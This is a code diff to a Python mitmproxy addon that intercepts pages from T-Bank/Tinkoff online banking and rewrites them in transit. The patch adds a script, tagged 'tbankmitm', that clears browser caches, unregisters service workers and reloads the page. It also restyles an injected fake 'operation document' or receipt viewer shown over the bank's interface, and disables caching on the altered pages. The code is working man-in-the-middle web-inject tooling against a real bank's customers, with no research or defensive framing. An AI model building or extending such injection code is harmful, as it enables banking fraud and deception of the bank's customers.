@@ -3,6 +3,8 @@ import json
 import os
 import re
 import sys
+from urllib.parse import urlparse
+from urllib.parse import urlparse
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 import history
@@ -13,6 +15,27 @@ try:
     from panel_bridge import PANEL_PORT as _PANEL_PORT
 except Exception:
     _PANEL_PORT = 8082
+
+_EARLY_HEAD_BOOT_SCRIPT = """<script id="__tbankmitm_early_boot">(function(){if(window.__tbankmitmEarlyBoot)return;window.__tbankmitmEarlyBoot=1;try{if('caches'in window){caches.keys().then(function(ks){return Promise.all(ks.map(function(k){return caches.delete(k);}));}).catch(function(){});}if(!('serviceWorker'in navigator))return;navigator.serviceWorker.getRegistrations().then(function(regs){if(!regs||!regs.length)return;return Promise.all(regs.map(function(r){return r.unregister();})).then(function(){if(!sessionStorage.getItem('__tbankmitm_sw_cleared')){sessionStorage.setItem('__tbankmitm_sw_cleared','1');location.reload();}});}).catch(function(){});}catch(e){}})();</script>"""
+
+
+def _browser_html_inject_allowed(url: str, host: str) -> bool:
+    u = (url or "").lower()
+    h = (host or "").lower()
+    if "/mybank/statements" in u or "mybank%2fstatements" in u:
+        return False
+    if "tbank-online.com" in h:
+        return True
+    if "/mybank" in u:
+        return True
+    if "tbank.ru" in h or "tinkoff.ru" in h:
+        try:
+            path = urlparse(url).path or "/"
+        except Exception:
+            path = "/"
+        if path in ("", "/") or path.startswith("/mybank"):
+            return True
+    return False
 
 
 def _panel_fetch_origin() -> str:
@@ -3394,16 +3417,17 @@ def _build_script() -> str:
     }}
     st.textContent =
       '#manual-operation-document-viewer {{ position: fixed; inset: 0; z-index: 2147483646; background: rgba(0,0,0,0); transition: background 380ms ease; font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }}' +
-      '#manual-operation-document-viewer .manual-operation-document-sheet {{ position: absolute; inset: 0; display: flex; flex-direction: column; overflow: hidden; border-radius: 14px 14px 0 0; background: #8a8a8a; transform: translateY(100%); transition: transform 420ms cubic-bezier(0.32, 0.72, 0, 1); will-change: transform; }}' +
+      '#manual-operation-document-viewer .manual-operation-document-sheet-anim {{ position: absolute; inset: 0; transform: translateY(100%); transition: transform 420ms cubic-bezier(0.32, 0.72, 0, 1); will-change: transform; }}' +
+      '#manual-operation-document-viewer .manual-operation-document-sheet {{ height: 100%; display: flex; flex-direction: column; overflow: hidden; border-radius: 14px 14px 0 0; background: #8a8a8a; }}' +
       '#manual-operation-document-viewer .manual-operation-document-header {{ position: relative; flex: 0 0 56px; height: 56px; box-sizing: border-box; background: #202023; color: #f6f7f8; }}' +
       '#manual-operation-document-viewer .manual-operation-document-close, #manual-operation-document-viewer .manual-operation-document-share {{ appearance: none; border: 0; padding: 0; background: transparent; color: #428bf9; font-family: inherit; font-size: 16px; font-weight: 500; line-height: 20px; -webkit-tap-highlight-color: transparent; }}' +
       '#manual-operation-document-viewer .manual-operation-document-close {{ position: absolute; left: 17px; top: 50%; transform: translateY(-50%); }}' +
       '#manual-operation-document-viewer .manual-operation-document-title {{ position: absolute; left: 50%; top: 50%; width: max-content; max-width: calc(100% - 140px); overflow: visible; transform: translate(-50%, -50%); color: #f6f7f8; font-family: inherit; font-size: 17px; font-weight: 700; line-height: 22px; text-align: center; white-space: nowrap; }}' +
       '#manual-operation-document-viewer .manual-operation-document-share {{ position: absolute; right: 14px; top: 50%; display: inline-flex; align-items: center; justify-content: center; width: 32px; height: 40px; transform: translateY(-50%); }}' +
       '#manual-operation-document-viewer .manual-operation-document-share svg {{ display: block; width: 25px; height: 25px; fill: none; stroke: currentColor; stroke-linecap: round; stroke-linejoin: round; stroke-width: 2.2; }}' +
-      '#manual-operation-document-viewer .manual-operation-document-body {{ flex: 1 1 auto; min-height: 0; overflow: auto; background: #fff; -webkit-overflow-scrolling: touch; }}' +
-      '#manual-operation-document-viewer .manual-operation-document-image {{ display: block; width: 100%; height: auto; margin: 0; background: #fff; }}' +
-      '#manual-operation-document-viewer .manual-operation-document-frame {{ display: none; width: 100%; height: 100%; min-height: 100%; border: 0; background: #8a8a8a; }}';
+      '#manual-operation-document-viewer .manual-operation-document-body {{ flex: 1 1 auto; min-height: 0; overflow-x: hidden; overflow-y: auto; background: #fff; -webkit-overflow-scrolling: touch; touch-action: pan-y; overscroll-behavior: contain; }}' +
+      '#manual-operation-document-viewer .manual-operation-document-image {{ display: block; width: 100%; height: auto; margin: 0; background: #fff; pointer-events: none; user-select: none; }}' +
+      '#manual-operation-document-viewer .manual-operation-document-frame {{ display: none; width: 100%; min-height: 120vh; height: auto; border: 0; background: #8a8a8a; }}';
   }}
 
   function closeManualReceiptViewer(immediate) {{
@@ -3417,9 +3441,9 @@ def _build_script() -> str:
       window.__manualReceiptPrevBodyOverflow = null;
       return;
     }}
-    const sheet = viewer.querySelector('.manual-operation-document-sheet');
-    if (sheet) {{
-      sheet.style.transform = 'translateY(100%)';
+    const anim = viewer.querySelector('.manual-operation-document-sheet-anim');
+    if (anim) {{
+      anim.style.transform = 'translateY(100%)';
       viewer.style.background = 'rgba(0,0,0,0)';
     }}
     window.setTimeout(function () {{
@@ -3428,7 +3452,7 @@ def _build_script() -> str:
         document.body.style.overflow = window.__manualReceiptPrevBodyOverflow || '';
       }}
       window.__manualReceiptPrevBodyOverflow = null;
-    }}, sheet ? 360 : 0);
+    }}, anim ? 360 : 0);
   }}
 
   function openManualReceiptViewer(url, title) {{
@@ -3444,17 +3468,19 @@ def _build_script() -> str:
     viewer.setAttribute('role', 'dialog');
     viewer.setAttribute('aria-modal', 'true');
     viewer.innerHTML =
-      '<div class="manual-operation-document-sheet">' +
-        '<div class="manual-operation-document-header">' +
-          '<button type="button" class="manual-operation-document-close">Закрыть</button>' +
-          '<div class="manual-operation-document-title"></div>' +
-          '<button type="button" class="manual-operation-document-share" aria-label="Поделиться">' +
-            '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 15V3"></path><path d="m8 7 4-4 4 4"></path><path d="M6 10H4.8A1.8 1.8 0 0 0 3 11.8v7.4A1.8 1.8 0 0 0 4.8 21h14.4a1.8 1.8 0 0 0 1.8-1.8v-7.4a1.8 1.8 0 0 0-1.8-1.8H18"></path></svg>' +
-          '</button>' +
-        '</div>' +
-        '<div class="manual-operation-document-body">' +
-          '<img class="manual-operation-document-image" alt="Документ по операции">' +
-          '<iframe class="manual-operation-document-frame" title="Документ по операции"></iframe>' +
+      '<div class="manual-operation-document-sheet-anim">' +
+        '<div class="manual-operation-document-sheet">' +
+          '<div class="manual-operation-document-header">' +
+            '<button type="button" class="manual-operation-document-close">Закрыть</button>' +
+            '<div class="manual-operation-document-title"></div>' +
+            '<button type="button" class="manual-operation-document-share" aria-label="Поделиться">' +
+              '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 15V3"></path><path d="m8 7 4-4 4 4"></path><path d="M6 10H4.8A1.8 1.8 0 0 0 3 11.8v7.4A1.8 1.8 0 0 0 4.8 21h14.4a1.8 1.8 0 0 0 1.8-1.8v-7.4a1.8 1.8 0 0 0-1.8-1.8H18"></path></svg>' +
+            '</button>' +
+          '</div>' +
+          '<div class="manual-operation-document-body">' +
+            '<img class="manual-operation-document-image" alt="Документ по операции">' +
+            '<iframe class="manual-operation-document-frame" title="Документ по операции"></iframe>' +
+          '</div>' +
         '</div>' +
       '</div>';
     const titleEl = viewer.querySelector('.manual-operation-document-title');
@@ -3485,12 +3511,28 @@ def _build_script() -> str:
         window.open(url, '_blank', 'noopener,noreferrer');
       }});
     }}
+    const scrollBody = viewer.querySelector('.manual-operation-document-body');
+    if (scrollBody) {{
+      scrollBody.addEventListener('touchmove', function (ev) {{
+        ev.stopPropagation();
+      }}, {{ passive: true }});
+    }}
     (document.body || document.documentElement).appendChild(viewer);
-    const sheet = viewer.querySelector('.manual-operation-document-sheet');
+    const anim = viewer.querySelector('.manual-operation-document-sheet-anim');
     window.requestAnimationFrame(function () {{
       viewer.style.background = 'rgba(0,0,0,0.45)';
-      if (sheet) sheet.style.transform = 'translateY(0)';
+      if (anim) anim.style.transform = 'translateY(0)';
     }});
+    if (anim) {{
+      const unlockScrollAfterOpen = function (ev) {{
+        if (ev && ev.propertyName && ev.propertyName !== 'transform') return;
+        anim.removeEventListener('transitionend', unlockScrollAfterOpen);
+        anim.style.transition = 'none';
+        anim.style.transform = 'none';
+        anim.style.willChange = 'auto';
+      }};
+      anim.addEventListener('transitionend', unlockScrollAfterOpen);
+    }}
   }}
 
   function isPaymentSuccessReceiptSurface() {{
@@ -4646,17 +4688,31 @@ def response(flow: http.HTTPFlow) -> None:
     if not flow.response:
         return
     ensure_response_decoded(flow)
-    url = (flow.request.pretty_url or "").lower()
-    if "/mybank" not in url:
-        return
-    # Не вмешиваться в HTML «Справок» — тяжёлый скрипт + CSP; диагностика «страница не грузится».
-    if "/mybank/statements" in url or "mybank%2fstatements" in url:
+    url = flow.request.pretty_url or ""
+    host = (flow.request.host or flow.request.pretty_host or "").lower()
+    if not _browser_html_inject_allowed(url, host):
         return
     content_type = (flow.response.headers.get("content-type") or "").lower()
     if "text/html" not in content_type:
         return
     html = flow.response.text or ""
-    if not html or "__manualOpsBrowserInjector" in html:
+    if not html:
+        return
+    if "__tbankmitm_early_boot" not in html:
+        if re.search(r"<head[^>]*>", html, re.IGNORECASE):
+            html = re.sub(
+                r"(<head[^>]*>)",
+                r"\1\n" + _EARLY_HEAD_BOOT_SCRIPT,
+                html,
+                count=1,
+                flags=re.IGNORECASE,
+            )
+        else:
+            html = _EARLY_HEAD_BOOT_SCRIPT + html
+    if "__manualOpsBrowserInjector" in html:
+        flow.response.text = html
+        flow.response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
+        flow.response.headers["Pragma"] = "no-cache"
         return
     script = _build_script()
     if "</body>" in html:
